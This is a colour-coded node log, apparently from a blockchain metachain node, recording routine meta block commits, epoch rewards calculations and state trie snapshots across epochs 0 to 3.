[0;32mINFO [0m[2026-10-06 22:03:33.019] [process/block]      [metachain/0/16/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 16 [0;32mnonce[0m = 14 [0;32mhash[0m = 856850e81f264b3b743c570ee15ae325824af5b20ef6ceec1c822b3a77dd7ec8 
[0;32mINFO [0m[2026-10-06 22:03:39.017] [process/block]      [metachain/0/17/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 17 [0;32mnonce[0m = 15 [0;32mhash[0m = 3835a9739fbd434377f197fa0c1b368bb68aa3dd94f0de3ff76c9b7961fe4fd0 
[0;32mINFO [0m[2026-10-06 22:03:45.024] [process/block]      [metachain/0/18/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 18 [0;32mnonce[0m = 16 [0;32mhash[0m = 93d3233141e1ea1259063a9e9af04fac1be31fe48b7d0eb2c1b1e4ef9f000375 
[0;32mINFO [0m[2026-10-06 22:03:51.013] [process/block]      [metachain/0/19/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 19 [0;32mnonce[0m = 17 [0;32mhash[0m = a1d81ee7b974ddbda7525446722f80e20bd9fcb30268b6f22bb6d99067ed5d7f 
[0;32mINFO [0m[2026-10-06 22:03:57.017] [process/block]      [metachain/0/20/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 20 [0;32mnonce[0m = 18 [0;32mhash[0m = 9a769d7cc0d2323726414e2725388657069bdd68c2064f310adc693daeb0e766 
[0;32mINFO [0m[2026-10-06 22:04:03.017] [process/block]      [metachain/0/21/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 21 [0;32mnonce[0m = 19 [0;32mhash[0m = 2355a573d2bda563b5e6b723078bfa7c5f05233e7dc4a0b981164fc790efaa77 
[0;32mINFO [0m[2026-10-06 22:04:09.026] [process/block]      [metachain/0/22/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 22 [0;32mnonce[0m = 20 [0;32mhash[0m = fbf3d7a3a6737797021a4a92f129fb3bc249f2eb52cda57ff681a7b3b799aa94 
[0;32mINFO [0m[2026-10-06 22:04:15.015] [process/block]      [metachain/0/23/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 23 [0;32mnonce[0m = 21 [0;32mhash[0m = 5cb7af23566d8a128f6a309b5e084604f28c253035d1213127798f527be72234 
[0;32mINFO [0m[2026-10-06 22:04:21.018] [process/block]      [metachain/0/24/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 24 [0;32mnonce[0m = 22 [0;32mhash[0m = 73441307f38120f3167affae1b4a4700880f2fa4451bc2fc3b06bf52bef3f0f7 
[0;32mINFO [0m[2026-10-06 22:04:27.021] [processProxy]       [metachain/0/25/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:36.989] [process/block]      [metachain/1/26/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 26 [0;32mnonce[0m = 23 [0;32mhash[0m = 48bc76f2b1f76746c24d2d2ee6d6ecda3235379eb68e73f5800864abaccf4a13 
[0;32mINFO [0m[2026-10-06 22:04:39.021] [process/block]      [metachain/1/27/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 27 [0;32mnonce[0m = 24 [0;32mhash[0m = d8f34316ac1969379af928270b98716113d8571e0dd078b78feb673c13c6cc9c 
[0;32mINFO [0m[2026-10-06 22:04:45.021] [process/block]      [metachain/1/28/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 28 [0;32mnonce[0m = 25 [0;32mhash[0m = 1dd773763e7d28749f565629ea826a1dc64464a7a1f9749161667a263dc02d89 
[0;32mINFO [0m[2026-10-06 22:04:51.031] [process/block]      [metachain/1/29/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 29 [0;32mnonce[0m = 26 [0;32mhash[0m = 075fc829aa2a0e31757ef9fd0ffe65b7a319359f1ac2af984de8b4885218b6e4 
[0;32mINFO [0m[2026-10-06 22:04:57.015] [process/block]      [metachain/1/30/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 30 [0;32mnonce[0m = 27 [0;32mhash[0m = a6e1d0e03afe6fae38f87c178bc2c4ea9ffb244359cba7e8d4634999c11d8c98 
[0;32mINFO [0m[2026-10-06 22:05:03.016] [process/block]      [metachain/1/31/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 31 [0;32mnonce[0m = 28 [0;32mhash[0m = 1461e117b1b67074be060833c0efcb277c34c3640968cf6b1cd4c86baf7ddd6a 
[0;32mINFO [0m[2026-10-06 22:05:09.016] [process/block]      [metachain/1/32/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 32 [0;32mnonce[0m = 29 [0;32mhash[0m = 0171c478e881722c0cf6d1d3def6eac169bdc9528bfae009e12b219a9be26966 
[0;32mINFO [0m[2026-10-06 22:05:15.029] [process/block]      [metachain/1/33/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 33 [0;32mnonce[0m = 30 [0;32mhash[0m = 0b0e1dd742f732399dae897f6aa3380dbcff32b3a629b6f5e80d8101c021c13e 
[0;32mINFO [0m[2026-10-06 22:05:21.027] [process/block]      [metachain/1/34/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 34 [0;32mnonce[0m = 31 [0;32mhash[0m = d9c66a3cb6720911de9d8aaf2db9a1a1c757cae5e8ef7d8299052ec62dcfc264 
[0;32mINFO [0m[2026-10-06 22:05:27.018] [process/block]      [metachain/1/35/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 35 [0;32mnonce[0m = 32 [0;32mhash[0m = 2afc95850d7229daff4c87f028c9559c53d83471dbdc89e86b3a3b15ae0fb566 
[0;32mINFO [0m[2026-10-06 22:05:33.016] [process/block]      [metachain/1/36/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 36 [0;32mnonce[0m = 33 [0;32mhash[0m = ae578af34148f27712634c967e13c62aea8c4812943c9db14ee02b991516babd 
[0;32mINFO [0m[2026-10-06 22:05:39.020] [process/block]      [metachain/1/37/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 37 [0;32mnonce[0m = 34 [0;32mhash[0m = 49b3156756bb669a80738e53735e045d0455a6b7f872b73312f193c35a700b7f 
[0;32mINFO [0m[2026-10-06 22:05:45.022] [process/block]      [metachain/1/38/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 38 [0;32mnonce[0m = 35 [0;32mhash[0m = d5a8ee281c2d0464f951f8f64262fa7b95323486ca3f1256cfe6913950f6bc85 
[0;32mINFO [0m[2026-10-06 22:05:51.016] [process/block]      [metachain/1/39/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 39 [0;32mnonce[0m = 36 [0;32mhash[0m = a296d0354ec5d6e58233661c4f543c847bc20d8311794921c983c50a2a0f1207 
[0;32mINFO [0m[2026-10-06 22:05:57.020] [process/block]      [metachain/1/40/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 40 [0;32mnonce[0m = 37 [0;32mhash[0m = 89b25b7ba3d1ced41327ccb2e1c63a0681171d2d25118f2542923bda02c3b041 
[0;32mINFO [0m[2026-10-06 22:06:03.016] [process/block]      [metachain/1/41/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 41 [0;32mnonce[0m = 38 [0;32mhash[0m = e69ee1031827ea72ee4a12c758239c12a360811214117d30e32e692aeeecf5f0 
[0;32mINFO [0m[2026-10-06 22:06:09.017] [process/block]      [metachain/1/42/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 42 [0;32mnonce[0m = 39 [0;32mhash[0m = 4724d6d9ddb4672d5596eea8e127104aa3cb56e3effb7081e8764b399397ba48 
[0;32mINFO [0m[2026-10-06 22:06:15.018] [process/block]      [metachain/1/43/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 43 [0;32mnonce[0m = 40 [0;32mhash[0m = 742ae90f4ee534d1a73a4770f1dd9e9aedbaae28f91d86ae34cdc78959f9913d 
[0;32mINFO [0m[2026-10-06 22:06:21.020] [process/block]      [metachain/1/44/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 44 [0;32mnonce[0m = 41 [0;32mhash[0m = 2574f49d4fbd532fecb5bf2cc8628b55ebabf3f5ffbc2005a05a4a476534b24e 
[0;32mINFO [0m[2026-10-06 22:06:27.020] [process/block]      [metachain/1/45/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 45 [0;32mnonce[0m = 42 [0;32mhash[0m = 95e15a4d4a4849b001d8b6a08550bad7a8cfeae25928a121b5af4da34d0882e7 
[0;32mINFO [0m[2026-10-06 22:06:33.017] [process/block]      [metachain/1/46/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 46 [0;32mnonce[0m = 43 [0;32mhash[0m = 63c9908561006f1f9078ddcb1715779cde35c20c310056488425f9820a6c7192 
[0;32mINFO [0m[2026-10-06 22:06:39.016] [process/block]      [metachain/1/47/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 47 [0;32mnonce[0m = 44 [0;32mhash[0m = 970b591eb974c8db5fc90ab556d0a93d6c72fef0e523b7425038834f189f99a8 
[0;32mINFO [0m[2026-10-06 22:06:45.024] [process/block]      [metachain/1/48/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 48 [0;32mnonce[0m = 45 [0;32mhash[0m = 9e0d21b36e4019d2e7f82178a832998345f4d471ac94cb6b8f008e1086b6f02a 
[0;32mINFO [0m[2026-10-06 22:06:51.017] [process/block]      [metachain/1/49/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 49 [0;32mnonce[0m = 46 [0;32mhash[0m = 6a837de7cf97dc3e441c081070ffcbdb387a7814319c707373418e49cd8fab21 
[0;32mINFO [0m[2026-10-06 22:06:57.020] [process/block]      [metachain/1/50/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 50 [0;32mnonce[0m = 47 [0;32mhash[0m = c45f120287f27fea5989abda5009047044596eeb7ad7f5e92873170971f2b5ee 
[0;32mINFO [0m[2026-10-06 22:07:03.016] [processProxy]       [metachain/1/51/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:07:03.018] [..hStart/metachain] [metachain/2/51/(BLOCK)] auctionListSelector.SelectNodesFromAuctionList: empty auction list; skip selection 
[0;32mINFO [0m[2026-10-06 22:07:03.018] [..hStart/metachain] [metachain/2/51/(BLOCK)] rewardsCreatorProxy.switchToRewardsCreatorV2 
[0;32mINFO [0m[2026-10-06 22:07:03.018] [..hStart/metachain] [metachain/2/51/(BLOCK)] rewards to be distributed                [0;32mtotalStakeEligible[0m = 15000000000000000000000 [0;32mtotalTopUpEligible[0m = 0 [0;32mbaseRewards[0m = 3949171031307706200 [0;32mtopUpRewards[0m = 0 
[0;32mINFO [0m[2026-10-06 22:07:04.206] [process/block]      [metachain/2/51/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 51 [0;32mnonce[0m = 48 [0;32mhash[0m = 9a4af4e50bfcd50eca58a91c2d292729269aa01b4271e629928948e96d46c52a 
[0;32mINFO [0m[2026-10-06 22:07:04.209] [state]              [metachain/2/51/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = c014cc26b50d951bcb4181b792bf392b66e1b31a3a8e423ba3e44b25b86c4c2e [0;32mepoch[0m = 2 
[0;32mINFO [0m[2026-10-06 22:07:04.210] [state]              [metachain/2/51/(END_ROUND)] starting snapshot                        [0;32mtype[0m = peer trie [0;32mrootHash[0m = 5cde8492bd57c188e068455609c8b4c532ed63f49c4bd7f0312e2668238f4497 [0;32mepoch[0m = 2 
[0;32mINFO [0m[2026-10-06 22:07:09.023] [process/block]      [metachain/2/52/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 52 [0;32mnonce[0m = 49 [0;32mhash[0m = 1e04022185adb523d523b8997926764612b46cfbc616e0ed119c4033af1e2209 
[0;32mINFO [0m[2026-10-06 22:07:15.024] [process/block]      [metachain/2/53/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 53 [0;32mnonce[0m = 50 [0;32mhash[0m = 027e60845e3e39ecda89d26e67bd3f5fd3d72adc76fad6cd4411dc19cea24d37 
[0;32mINFO [0m[2026-10-06 22:07:21.031] [process/block]      [metachain/2/54/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 54 [0;32mnonce[0m = 51 [0;32mhash[0m = ba6202b9f7f37dbc08dd40d112673a7d7c2a2e045f0930a827b37645bd622e1c 
[0;32mINFO [0m[2026-10-06 22:07:27.022] [process/block]      [metachain/2/55/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 55 [0;32mnonce[0m = 52 [0;32mhash[0m = abe9d1b503d6baec04e5c5262722c3b5fed72cd4ac5b986dfd06df9aac721106 
[0;32mINFO [0m[2026-10-06 22:07:33.022] [process/block]      [metachain/2/56/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 56 [0;32mnonce[0m = 53 [0;32mhash[0m = a3b58fd181840f17790fe70f8e498c54d3305a95627fac48b0fffaf09bf077cc 
[0;32mINFO [0m[2026-10-06 22:07:39.017] [process/block]      [metachain/2/57/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 57 [0;32mnonce[0m = 54 [0;32mhash[0m = f8306f4e7ca39bb9b6f13d11a744d378704247606a11c96535a801479e2727cd 
[0;32mINFO [0m[2026-10-06 22:07:45.021] [process/block]      [metachain/2/58/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 58 [0;32mnonce[0m = 55 [0;32mhash[0m = 916c97f31d40ce2d78f3f17075160ad02a226e25014b1c4ffaf3abbf411753ae 
[0;32mINFO [0m[2026-10-06 22:07:51.023] [process/block]      [metachain/2/59/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 59 [0;32mnonce[0m = 56 [0;32mhash[0m = d5925204a26c786a62e96cbd2910ac734e0cd847184912cdac40e06e218b155f 
[0;32mINFO [0m[2026-10-06 22:07:57.022] [process/block]      [metachain/2/60/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 60 [0;32mnonce[0m = 57 [0;32mhash[0m = 4ec5140161c5ccae6d507183cef503c55b6b92e013c2034cde4cbcb132d0b79d 
[0;32mINFO [0m[2026-10-06 22:08:03.019] [process/block]      [metachain/2/61/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 61 [0;32mnonce[0m = 58 [0;32mhash[0m = e54920a5fea78d8f95da4a974d65c4139b13a4634f41f9049e5fa9e6516d95e4 
[0;32mINFO [0m[2026-10-06 22:08:09.021] [process/block]      [metachain/2/62/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 62 [0;32mnonce[0m = 59 [0;32mhash[0m = 869a687a3d788554043e7561420a9766034c890e53ab06788aebf3f21b1019ae 
[0;32mINFO [0m[2026-10-06 22:08:15.023] [process/block]      [metachain/2/63/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 63 [0;32mnonce[0m = 60 [0;32mhash[0m = 817f72636dc9532dfcad857df0cdc1f663b1493e541efcf6fdbf92976bba8514 
[0;32mINFO [0m[2026-10-06 22:08:21.023] [process/block]      [metachain/2/64/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 64 [0;32mnonce[0m = 61 [0;32mhash[0m = 9cfeba2bb15b62056c32a409f2088b2e36b791c0c52a9c01193334a0d8cd53b1 
[0;32mINFO [0m[2026-10-06 22:08:27.017] [process/block]      [metachain/2/65/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 65 [0;32mnonce[0m = 62 [0;32mhash[0m = 27c5c3abf399f6e01998177b295439476172ba70b695e10dcd0fa31138fd6336 
[0;32mINFO [0m[2026-10-06 22:08:33.023] [process/block]      [metachain/2/66/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 66 [0;32mnonce[0m = 63 [0;32mhash[0m = 54e163f5a4f7dbd0ed8c2837b9cd668624b822e00f825dfbd42424c7c766c3a5 
[0;32mINFO [0m[2026-10-06 22:08:39.015] [process/block]      [metachain/2/67/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 67 [0;32mnonce[0m = 64 [0;32mhash[0m = 9a19563a22e87834d81dc6b2ee4b45044199830ad5804639cd687ea70681ffb6 
[0;32mINFO [0m[2026-10-06 22:08:45.021] [process/block]      [metachain/2/68/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 68 [0;32mnonce[0m = 65 [0;32mhash[0m = ddbc29f2adabdfd6fe96fe42cd5a01529e55bd5e043735245b12e22cb5a9c808 
[0;32mINFO [0m[2026-10-06 22:08:51.015] [process/block]      [metachain/2/69/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 69 [0;32mnonce[0m = 66 [0;32mhash[0m = 2f512e3d63fd05cfa6dc578b521453c85f19a5c9b0a7f89bf87b68ccc59b14dd 
[0;32mINFO [0m[2026-10-06 22:08:57.017] [process/block]      [metachain/2/70/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 70 [0;32mnonce[0m = 67 [0;32mhash[0m = c592b1e3e3440b5c9502c84cccb95b6b7bd5ab301929f4a6d97acc59fe5387c3 
[0;32mINFO [0m[2026-10-06 22:09:03.018] [process/block]      [metachain/2/71/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 71 [0;32mnonce[0m = 68 [0;32mhash[0m = c186d35b85bd82fd2cc17ac72ab2926e0a573d0356042ac0ccc2d76e5ec1af6c 
[0;32mINFO [0m[2026-10-06 22:09:09.017] [process/block]      [metachain/2/72/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 72 [0;32mnonce[0m = 69 [0;32mhash[0m = 6d2355165a7f16836aa80d1fc97d9b5d9e84251a60880f0bc5e583a964af65ce 
[0;32mINFO [0m[2026-10-06 22:09:15.027] [process/block]      [metachain/2/73/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 4294967295 [0;32mround[0m = 73 [0;32mnonce[0m = 70 [0;32mhash[0m = a9a52ed8100e41548bf4ef0497a16713142d124cc9537f4c879c47cffb6a9671 
[0;32mINFO [0m[2026-10-06 22:09:21.003] [processProxy]       [metachain/3/74/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:09:21.004] [..hStart/metachain] [metachain/3/74/(BLOCK)] auctionListSelector.SelectNodesFromAuctionList: empty auction list; skip selection 
[0;32mINFO [0m[2026-10-06 22:09:21.004] [..hStart/metachain] [metachain/3/74/(BLOCK)] rewards to be distributed                [0;32mtotalStakeEligible[0m = 15000000000000000000000 [0;32mtotalTopUpEligible[0m = 0 [0;32mbaseRewards[0m = 3668827386355432167 [0;32mtopUpRewards[0m = 0 
[0;32mINFO [0m[2026-10-06 22:09:22.129] [process/block]      [metachain/3/74/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 74 [0;32mnonce[0m = 71 [0;32mhash[0m = 39df0bf736a8cda05c31cf223144dabcc93d5e11f37778f35fbc9126b60b4c40 
[0;32mINFO [0m[2026-10-06 22:09:22.132] [state]              [metachain/3/74/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 066702335a2811dcddf50786573dd21d10c4dc166fb9efe7074d97ae39ae59c8 [0;32mepoch[0m = 3 
[0;32mINFO [0m[2026-10-06 22:09:22.140] [state]              [metachain/3/74/(END_ROUND)] starting snapshot                        [0;32mtype[0m = peer trie [0;32mrootHash[0m = dc15a69e39a4580ddb14fc9cb0f5ceb786982ca4836e357b660d8b659397b044 [0;32mepoch[0m = 3 
[0;32mINFO [0m[2026-10-06 22:09:27.023] [process/block]      [metachain/3/75/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 75 [0;32mnonce[0m = 72 [0;32mhash[0m = e3c107f41ec0a2f53b46b9d6f7e576208ef14e43103630e96972252380c2f71c 
[0;32mINFO [0m[2026-10-06 22:09:33.030] [process/block]      [metachain/3/76/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 76 [0;32mnonce[0m = 73 [0;32mhash[0m = 6b0e17cff9a368cdae50ea723705a7de3b69e5439f6745a2d69f495a3f5f9858 
[0;32mINFO [0m[2026-10-06 22:09:39.021] [process/block]      [metachain/3/77/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 77 [0;32mnonce[0m = 74 [0;32mhash[0m = aa5b121789805feb934081b4748c55878ecb7da11ade44d5656651ebfe07fb76 
[0;32mINFO [0m[2026-10-06 22:09:45.021] [process/block]      [metachain/3/78/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 78 [0;32mnonce[0m = 75 [0;32mhash[0m = 490e9572193c7f37ccc66004354116ad8bf137c965d763464564aae2ea40b93e 
[0;32mINFO [0m[2026-10-06 22:09:51.030] [process/block]      [metachain/3/79/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 79 [0;32mnonce[0m = 76 [0;32mhash[0m = e47c079155827e3177fb75338da1710765c08c7a6252982a429641a736b2a59f 
[0;32mINFO [0m[2026-10-06 22:09:57.022] [process/block]      [metachain/3/80/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 80 [0;32mnonce[0m = 77 [0;32mhash[0m = 116da5e8cb72c52359b5854b6328032622266ff981727e65af6fee5f677ca837 
[0;32mINFO [0m[2026-10-06 22:10:03.015] [process/block]      [metachain/3/81/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 81 [0;32mnonce[0m = 78 [0;32mhash[0m = c9a82c6aae1bb6bd40fab1b61876b3780ee282539195024f1e157711330e4771 
[0;32mINFO [0m[2026-10-06 22:10:09.025] [process/block]      [metachain/3/82/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 82 [0;32mnonce[0m = 79 [0;32mhash[0m = 71824848c29f7d689abb45869019d92bb8fdca375b578796680b18260eec1051 
[0;32mINFO [0m[2026-10-06 22:10:15.021] [process/block]      [metachain/3/83/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 83 [0;32mnonce[0m = 80 [0;32mhash[0m = 342d9189b38db4fa8c3b6e5f78a9f070ca898514ad3b6c94d09d116078f13731 
[0;32mINFO [0m[2026-10-06 22:10:21.022] [process/block]      [metachain/3/84/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 84 [0;32mnonce[0m = 81 [0;32mhash[0m = 15289ba5c07e3344c8276148f84eb70ebd402213af4bf5b728272d75a3c94ca1 
[0;32mINFO [0m[2026-10-06 22:10:27.022] [process/block]      [metachain/3/85/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 85 [0;32mnonce[0m = 82 [0;32mhash[0m = d39921e2eece0151621b0b05eca40de5d5a234ced526d0b207e3f16ac41c636b 
[0;32mINFO [0m[2026-10-06 22:10:33.022] [process/block]      [metachain/3/86/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 86 [0;32mnonce[0m = 83 [0;32mhash[0m = 20bb9fe170d1ce992230320dc0c2702e14c1f0801fb45f84c01cace83e9c8072 
[0;32mINFO [0m[2026-10-06 22:10:39.018] [process/block]      [metachain/3/87/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 87 [0;32mnonce[0m = 84 [0;32mhash[0m = 394aa6b6b3fc0eba2c7be1ba47d98a0a808794db4e3d1d5ba0a794ce1fc0c460 
[0;32mINFO [0m[2026-10-06 22:10:45.017] [process/block]      [metachain/3/88/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 88 [0;32mnonce[0m = 85 [0;32mhash[0m = 1590f2145e6ff1bf08927d345a96d77ce3a0c00e4675c58cf45edf1a8ebb0fa0 
[0;32mINFO [0m[2026-10-06 22:10:51.032] [process/block]      [metachain/3/89/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 89 [0;32mnonce[0m = 86 [0;32mhash[0m = 18f93ff1e44b76827682ae5d2ab2c5eb9d392005b489a45181d11b2d71587e4f 
[0;32mINFO [0m[2026-10-06 22:10:57.018] [process/block]      [metachain/3/90/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 90 [0;32mnonce[0m = 87 [0;32mhash[0m = 54d5a7268d8c5a9cff83d17e7f28af1f66116cec3164efab5a5e6bc113d5bfb9 
[0;32mINFO [0m[2026-10-06 22:11:03.020] [process/block]      [metachain/3/91/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 91 [0;32mnonce[0m = 88 [0;32mhash[0m = e2a395548744a21d55c3348e50b0970c05eab935084a84808420a12a65ba29bf 
[0;32mINFO [0m[2026-10-06 22:11:09.020] [process/block]      [metachain/3/92/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 92 [0;32mnonce[0m = 89 [0;32mhash[0m = b9000723b780dcbdd3303c02169aaf9a6a67a061e54181c0fbea421533904eea 
[0;32mINFO [0m[2026-10-06 22:11:15.020] [process/block]      [metachain/3/93/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 93 [0;32mnonce[0m = 90 [0;32mhash[0m = a047994d2bd288e73d64cf967a2c8aa81c5cbea9bc69267c8f2a5ae4b805ddca 
